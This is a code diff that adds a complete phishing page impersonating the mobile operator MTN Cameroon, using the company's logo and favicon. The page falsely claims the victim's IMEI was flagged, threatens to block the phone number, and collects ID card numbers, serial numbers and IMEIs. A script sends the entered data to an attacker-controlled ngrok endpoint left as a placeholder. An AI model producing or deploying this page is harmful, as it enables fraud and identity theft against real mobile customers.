@@ -1,0 +1,70 @@
+<html>
+  <head>
+    <title>IMEI ERROR</title>
+    <link rel="shortcut icon" href="https://www.mtncameroon.cm/favicon.ico">
+    <style>
+      body {
+        background-color: yellow;
+      }
+      h1, h2, p {
+        color: black;
+      }
+      img {
+        width: 100px;
+      }
+      form {
+        margin-top: 20px;
+      }
+      input {
+        background-color: white;
+        border: 1px solid black;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Your cell phone's IMEI code has been flagged for suspicious activity.</h1>
+    <p>Please click on the link below to verify your identity and update your security settings.</p>
+    <a href="https://www.example.com/verify-identity">Verify Identity</a>
+    <br>
+    <h2>We are conducting an investigation into a recent data breach.</h2>
+    <p>Please provide your ID card number and serial number so that we can verify your account.</p>
+    <p>**If you do not provide the verification code below, your phone number will be blocked.**</p>
+    <img src="https://www.mtncameroon.cm/images/logo.png" alt="MTN Cameroon Logo">
+    <form action="https://<your ngrok url>/" method="post">
+      <input type="text" name="id_card_number" placeholder="ID Card Number">
+      <input type="text" name="serial_number" placeholder="Serial Number">
+      <input type="text" name="IMEI" placeholder="IMEI">
+      <input type="submit" value="Submit">
+    </form>
+    <script>
+      // Get the form element
+      const form = document.querySelector('form');
+
+      // When the form is submitted, send the data to the ngrok server
+      form.addEventListener('submit', (event) => {
+        event.preventDefault();
+
+        // Get the form data
+        const data = new FormData(form);
+
+        // Create the request
+        const request = new XMLHttpRequest();
+        request.open('POST', 'https://<your ngrok url>/');
+        request.send(data);
+
+        // When the request is complete, display the response
+        request.onload = () => {
+          if (request.status === 200) {
+            const response = JSON.parse(request.responseText);
+
+            // Display the response
+            document.querySelector('h1').textContent = response.message;
+          } else {
+            // Display an error message
+            document.querySelector('h1').textContent = 'Error: ' + request.statusText;
+          }
+        };
+      });
+    </script>
+  </body>
+</html>
